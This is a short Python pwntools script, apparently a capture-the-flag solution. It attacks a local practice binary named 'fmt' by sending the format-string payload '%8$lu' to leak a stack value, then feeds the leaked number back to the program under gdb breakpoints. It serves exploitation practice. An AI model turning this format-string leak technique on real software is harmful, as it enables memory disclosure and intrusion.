#!/usr/bin/python3

from pwn import *

exe = ELF('./fmt')

p= process(exe.path)
p= gdb.debug(exe.path,'''
             b* vuln+278
             b* vuln+291 
             c
             c
             ''')

p.sendlineafter("Enter your name: ",b'%8$lu')
p.recvuntil("Your name is: ")

rec = int(p.recvuntil(b"\n",drop = True))
log.info("number: " + hex(rec))
input("ENTER TO CONTINUE")
p.sendlineafter("number: ",str(rec))

p.interactive()
